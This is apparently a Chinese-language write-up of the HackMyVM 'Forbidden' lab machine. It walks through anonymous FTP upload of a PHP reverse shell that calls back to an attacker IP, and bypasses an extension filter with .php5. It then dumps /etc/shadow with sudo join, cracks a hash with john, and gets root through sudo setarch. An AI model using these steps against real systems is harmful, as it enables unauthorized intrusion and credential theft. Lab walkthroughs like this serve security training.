---
title: Forbidden
author: hgbe02
date: 2024-07-09 17:10:10 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Forbidden.html"
---

# Forbidden

![image-20240706125154604](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407091714764.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407091714766.png" alt="image-20240709153437375" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/Forbidden]
└─$ rustscan -a $IP -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.162:80
Open 192.168.0.162:21

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.143
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Oct 09  2020 www [NSE: writeable]
80/tcp open  http    syn-ack nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Unix
```

### 目录爆破

```bash
┌──(kali💀kali)-[~/temp/Forbidden]
└─$ gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,bak,jpg,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.162/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,bak,jpg,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 241]
/robots.txt           (Status: 200) [Size: 10]
/note.txt             (Status: 200) [Size: 75]
Progress: 381267 / 1323366 (28.81%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 381476 / 1323366 (28.83%)
===============================================================
Finished
===============================================================
```

## 漏洞发现

### 踩点

```bash
http://192.168.0.162/

SECURE WEB/FTP
Hi, Im the best admin of the world. You cannot execute .php code on this server so you cannot obtain a reverse shell. Not sure if its misconfigured another things... but the importart is that php is disabled. -marta
```

得到一个用户名`marta`，他说php是难以执行的

### 敏感目录

```bash
http://192.168.0.162/robots.txt
/note.txt
```

```bash
http://192.168.0.162/note.txt
The extra-secured .jpg file contains my password but nobody can obtain it.
```

### 敏感端口

开启了 21 端口 ftp 服务，尝试查看有无隐藏信息，以及尝试上传反弹 shell：

```bash
┌──(kali💀kali)-[~/temp/Forbidden]
└─$ vim revshell.phtml   

┌──(kali💀kali)-[~/temp/Forbidden]
└─$ head revshell.phtml                                          

  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '192.168.0.143';  // You have changed this
  $port = 1234;  // And this
  $chunk_size = 1400;

┌──(kali💀kali)-[~/temp/Forbidden]
└─$ file revshell.phtml                                                                                                              
revshell.phtml: ASCII text
```

然后尝试上传：

```bash
┌──(kali💀kali)-[~/temp/Forbidden]
└─$ ftp $IP                                                                                                                          
Connected to 192.168.0.162.
220 (vsFTPd 3.0.3)
Name (192.168.0.162:kali): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||5129|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        113          4096 Oct 09  2020 .
drwxr-xr-x    3 0        113          4096 Oct 09  2020 ..
drwxrwxrwx    2 0        0            4096 Oct 09  2020 www
226 Directory send OK.
ftp> cd www
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||16109|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Oct 09  2020 .
drwxr-xr-x    3 0        113          4096 Oct 09  2020 ..
-rwxrwxrwx    1 0        0             241 Oct 09  2020 index.html
-rwxrwxrwx    1 0        0              75 Oct 09  2020 note.txt
-rwxrwxrwx    1 0        0              10 Oct 09  2020 robots.txt
226 Directory send OK.
ftp> put revshell.phtml 
local: revshell.phtml remote: revshell.phtml
229 Entering Extended Passive Mode (|||38821|)
150 Ok to send data.
100% |******************************************************************************************************|  3911        5.45 MiB/s    00:00 ETA
226 Transfer complete.
3911 bytes sent in 00:00 (458.99 KiB/s)
ftp> exit
221 Goodbye.
```

访问尝试连接，发现连不上，试试是不是封锁的很完整：

```text
Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml
```

当我访问：http://192.168.0.162/1.php5 时成功了！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407091714767.png" alt="image-20240709160438554" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@forbidden:/$ cd ~
(remote) www-data@forbidden:/var/www$ cd html
(remote) www-data@forbidden:/var/www/html$ ls -la
total 48
drwxr-xr-x 2 root     root      4096 Oct  9  2020 .
drwxr-xr-x 3 root     root      4096 Oct  9  2020 ..
-rwxrwxrwx 1 www-data www-data 33469 Oct  9  2020 TOPSECRETIMAGE.jpg
-rw-r--r-- 1 root     root       612 Oct  9  2020 index.nginx-debian.html
(remote) www-data@forbidden:/var/www/html$ cat index.nginx-debian.html 
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>

(remote) www-data@forbidden:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
marta:x:1000:1000:marta,,,:/home/marta:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ftp:x:105:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
markos:x:1001:1001:,,,:/home/markos:/bin/bash
peter:x:1002:1002:,,,:/home/peter:/bin/bash
(remote) www-data@forbidden:/$ find / -perm -u=s -type f 2>/dev/null
/home/marta/.forbidden
/usr/bin/mount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/su
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
(remote) www-data@forbidden:/$ ls -la /home/marta/.forbidden
-rwsr-sr-x 1 root marta 16712 Oct  9  2020 /home/marta/.forbidden
(remote) www-data@forbidden:/$ file /home/marta/.forbidden
/home/marta/.forbidden: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2bfa60b6faf88c21128b04f602804f0b042d8e84, not stripped
```

### 照片藏密码

找到了前面一开始说的图片以及一个奇怪的程序，下载到本地看看：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407091714768.png" alt="image-20240709164530333" style="zoom: 33%;" />

本地看一下有无隐藏信息：

```bash
hgbe02@pwn:/mnt/c/Users/Administrator/Desktop$ exiftool TOPSECRETIMAGE.jpg
ExifTool Version Number         : 12.40
File Name                       : TOPSECRETIMAGE.jpg
Directory                       : .
File Size                       : 33 KiB
File Modification Date/Time     : 2020:10:10 01:04:22+08:00
File Access Date/Time           : 2024:07:09 16:45:21+08:00
File Inode Change Date/Time     : 2024:07:09 16:45:08+08:00
File Permissions                : -rwxrwxrwx
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 324
Image Height                    : 216
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 324x216
Megapixels                      : 0.070

hgbe02@pwn:/mnt/c/Users/Administrator/Desktop$ binwalk TOPSECRETIMAGE.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```

他说密码在里面的，尝试一下名字，带不带`.jpg`的都试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407091714769.png" alt="image-20240709165028676" style="zoom:50%;" />

### join读取文件

```bash
marta@forbidden:/var/www/html$ cd ~
marta@forbidden:~$ ls -la
total 52
drwxr-xr-x 3 marta marta  4096 Oct  9  2020 .
drwxr-xr-x 5 root  root   4096 Oct  9  2020 ..
-rw-r--r-- 1 marta marta   220 Oct  9  2020 .bash_logout
-rw-r--r-- 1 marta marta  3526 Oct  9  2020 .bashrc
-rwsr-sr-x 1 root  marta 16712 Oct  9  2020 .forbidden
-rw-r--r-- 1 root  root    130 Oct  9  2020 hidden.c
drwxr-xr-x 3 marta marta  4096 Oct  9  2020 .local
-rw-r--r-- 1 marta marta   807 Oct  9  2020 .profile
-rw------- 1 marta marta    55 Oct  9  2020 .Xauthority
marta@forbidden:~$ sudo -l
Matching Defaults entries for marta on forbidden:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User marta may run the following commands on forbidden:
    (ALL : ALL) NOPASSWD: /usr/bin/join
```

尝试合并`/etc/shadow`查看密码：

```bash
marta@forbidden:~$ /usr/bin/join --help
Usage: /usr/bin/join [OPTION]... FILE1 FILE2
For each pair of input lines with identical join fields, write a line to
standard output.  The default join field is the first, delimited by blanks.

When FILE1 or FILE2 (not both) is -, read standard input.

  -a FILENUM        also print unpairable lines from file FILENUM, where
                      FILENUM is 1 or 2, corresponding to FILE1 or FILE2
  -e EMPTY          replace missing input fields with EMPTY
  -i, --ignore-case  ignore differences in case when comparing fields
  -j FIELD          equivalent to '-1 FIELD -2 FIELD'
  -o FORMAT         obey FORMAT while constructing output line
  -t CHAR           use CHAR as input and output field separator
  -v FILENUM        like -a FILENUM, but suppress joined output lines
  -1 FIELD          join on this FIELD of file 1
  -2 FIELD          join on this FIELD of file 2
  --check-order     check that the input is correctly sorted, even
                      if all input lines are pairable
  --nocheck-order   do not check that the input is correctly sorted
  --header          treat the first line in each file as field headers,
                      print them without trying to pair them
  -z, --zero-terminated     line delimiter is NUL, not newline
      --help     display this help and exit
      --version  output version information and exit

Unless -t CHAR is given, leading blanks separate fields and are ignored,
else fields are separated by CHAR.  Any FIELD is a field number counted
from 1.  FORMAT is one or more comma or blank separated specifications,
each being 'FILENUM.FIELD' or '0'.  Default FORMAT outputs the join field,
the remaining fields from FILE1, the remaining fields from FILE2, all
separated by CHAR.  If FORMAT is the keyword 'auto', then the first
line of each file determines the number of fields output for each line.

Important: FILE1 and FILE2 must be sorted on the join fields.
E.g., use "sort -k 1b,1" if 'join' has no options,
or use "join -t ''" if 'sort' has no options.
Note, comparisons honor the rules specified by 'LC_COLLATE'.
If the input is not sorted and some lines cannot be joined, a
warning message will be given.

GNU coreutils online help: <https://www.gnu.org/software/coreutils/>
Full documentation at: <https://www.gnu.org/software/coreutils/join>
or available locally via: info '(coreutils) join invocation'
```

对它自己本身进行合并，并输出所有不匹配行：

```bash
marta@forbidden:~$ sudo join /etc/shadow /etc/shadow
root:$6$8nU2FdqnxRtT9mWF$9q7El.D7BDrlzNyYYPNqjTcwsQEsC7utrzszLgbe9V.3KqYSfx2XgqjIEeToP41TJTiZQOGVsdCzIAYHw5O.51:18544:0:99999:7:::
daemon:*:18544:0:99999:7:::
bin:*:18544:0:99999:7:::
sys:*:18544:0:99999:7:::
sync:*:18544:0:99999:7:::
games:*:18544:0:99999:7:::
man:*:18544:0:99999:7:::
lp:*:18544:0:99999:7:::
mail:*:18544:0:99999:7:::
news:*:18544:0:99999:7:::
uucp:*:18544:0:99999:7:::
proxy:*:18544:0:99999:7:::
www-data:*:18544:0:99999:7:::
backup:*:18544:0:99999:7:::
list:*:18544:0:99999:7:::
irc:*:18544:0:99999:7:::
gnats:*:18544:0:99999:7:::
nobody:*:18544:0:99999:7:::
_apt:*:18544:0:99999:7:::
systemd-timesync:*:18544:0:99999:7:::
systemd-network:*:18544:0:99999:7:::
systemd-resolve:*:18544:0:99999:7:::
messagebus:*:18544:0:99999:7:::
marta:$6$h.4ZF5esZ/N1OIcu$8vL1D3iM6iuhniSG8nIz0582atbIV6y/UBl0eks1.Wrd51BqLK8Wqt91WXg0Y2mrdNY4luPQkqUWXFXWxLVwe/:18544:0:99999:7:::
systemd-coredump:!!:18544::::::
ftp:*:18544:0:99999:7:::
sshd:*:18544:0:99999:7:::
markos:$6$PTerrFpyfOmkM5Xi$oo8gNZyyxsZbKhOIXrm2w/x.Xvhdr7Ny/4JgLDRLRAxAwEwGtH2kD7PjzeloAstqCPq/KKrqrPioMM8vwWbqZ.:18544:0:99999:7:::
peter:$6$QAeWH9Et9PAJdYz/$/4VhburW9KoVTRY1Ry63wNEfr4rxwQGaRJ3kKW2nEAk0LcqjqZjy/m5rtaCi3VebNu7AaGFhQT4FBgbQVIyq81:18544:0:99999:7:::
```

或者参考 https://gtfobins.github.io/gtfobins/join/#sudo

```bash
marta@forbidden:~$ sudo join -a 2 /dev/null /etc/shadow
root:$6$8nU2FdqnxRtT9mWF$9q7El.D7BDrlzNyYYPNqjTcwsQEsC7utrzszLgbe9V.3KqYSfx2XgqjIEeToP41TJTiZQOGVsdCzIAYHw5O.51:18544:0:99999:7:::
daemon:*:18544:0:99999:7:::
bin:*:18544:0:99999:7:::
sys:*:18544:0:99999:7:::
sync:*:18544:0:99999:7:::
games:*:18544:0:99999:7:::
man:*:18544:0:99999:7:::
lp:*:18544:0:99999:7:::
mail:*:18544:0:99999:7:::
news:*:18544:0:99999:7:::
uucp:*:18544:0:99999:7:::
proxy:*:18544:0:99999:7:::
www-data:*:18544:0:99999:7:::
backup:*:18544:0:99999:7:::
list:*:18544:0:99999:7:::
irc:*:18544:0:99999:7:::
gnats:*:18544:0:99999:7:::
nobody:*:18544:0:99999:7:::
_apt:*:18544:0:99999:7:::
systemd-timesync:*:18544:0:99999:7:::
systemd-network:*:18544:0:99999:7:::
systemd-resolve:*:18544:0:99999:7:::
messagebus:*:18544:0:99999:7:::
marta:$6$h.4ZF5esZ/N1OIcu$8vL1D3iM6iuhniSG8nIz0582atbIV6y/UBl0eks1.Wrd51BqLK8Wqt91WXg0Y2mrdNY4luPQkqUWXFXWxLVwe/:18544:0:99999:7:::
systemd-coredump:!!:18544::::::
ftp:*:18544:0:99999:7:::
sshd:*:18544:0:99999:7:::
markos:$6$PTerrFpyfOmkM5Xi$oo8gNZyyxsZbKhOIXrm2w/x.Xvhdr7Ny/4JgLDRLRAxAwEwGtH2kD7PjzeloAstqCPq/KKrqrPioMM8vwWbqZ.:18544:0:99999:7:::
peter:$6$QAeWH9Et9PAJdYz/$/4VhburW9KoVTRY1Ry63wNEfr4rxwQGaRJ3kKW2nEAk0LcqjqZjy/m5rtaCi3VebNu7AaGFhQT4FBgbQVIyq81:18544:0:99999:7:::
```

这里实际上直接读取rootflag也是可以的，但是我们想拿到shell，所以接着做！拿到本地尝试破译：

```bash
┌──(kali💀kali)-[~/temp/Forbidden]
└─$ cat hash                                                           
markos:$6$PTerrFpyfOmkM5Xi$oo8gNZyyxsZbKhOIXrm2w/x.Xvhdr7Ny/4JgLDRLRAxAwEwGtH2kD7PjzeloAstqCPq/KKrqrPioMM8vwWbqZ.:18544:0:99999:7:::
peter:$6$QAeWH9Et9PAJdYz/$/4VhburW9KoVTRY1Ry63wNEfr4rxwQGaRJ3kKW2nEAk0LcqjqZjy/m5rtaCi3VebNu7AaGFhQT4FBgbQVIyq81:18544:0:99999:7:::
marta:$6$h.4ZF5esZ/N1OIcu$8vL1D3iM6iuhniSG8nIz0582atbIV6y/UBl0eks1.Wrd51BqLK8Wqt91WXg0Y2mrdNY4luPQkqUWXFXWxLVwe/:18544:0:99999:7:::
root:$6$8nU2FdqnxRtT9mWF$9q7El.D7BDrlzNyYYPNqjTcwsQEsC7utrzszLgbe9V.3KqYSfx2XgqjIEeToP41TJTiZQOGVsdCzIAYHw5O.51:18544:0:99999:7:::

┌──(kali💀kali)-[~/temp/Forbidden]
└─$ john hash                                            
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
boomer           (peter)     
1g 0:00:02:33 34.25% 2/3 (ETA: 05:10:59) 0.006493g/s 447.2p/s 1186c/s 1186C/s noway0..smitty0
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

### serarch提权

```bash
peter@forbidden:~$ ls -la
total 24
drwxr-xr-x 2 peter peter 4096 Oct  9  2020 .
drwxr-xr-x 5 root  root  4096 Oct  9  2020 ..
-rw------- 1 peter peter   12 Oct  9  2020 .bash_history
-rw-r--r-- 1 peter peter  220 Oct  9  2020 .bash_logout
-rw-r--r-- 1 peter peter 3526 Oct  9  2020 .bashrc
-rw-r--r-- 1 peter peter  807 Oct  9  2020 .profile
peter@forbidden:~$ sudo -l
Matching Defaults entries for peter on forbidden:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on forbidden:
    (ALL : ALL) NOPASSWD: /usr/bin/setarch
```

可以参考：https://gtfobins.github.io/gtfobins/setarch/

```bash
peter@forbidden:~$ echo $arch

peter@forbidden:~$ uname -a
Linux forbidden 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
peter@forbidden:~$ sudo setarch x86_64 /bin/bash
root@forbidden:/home/peter# cd ~
root@forbidden:~# ls -la
total 24
drwx------  3 root root 4096 Oct  9  2020 .
drwxr-xr-x 18 root root 4096 Oct  9  2020 ..
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Oct  9  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   16 Oct  9  2020 root.txt
root@forbidden:~# cat root.txt 
xxxxxxx
root@forbidden:~# find / -name user.txt 2>/dev/null
/home/markos/user.txt
```

## 参考

https://kerszl.github.io/hacking/walkthrough/Forbidden/

https://github.com/cankadioglu/HackMyVM/blob/main/Forbidden

https://kaianperez.github.io/forbidden/#ftp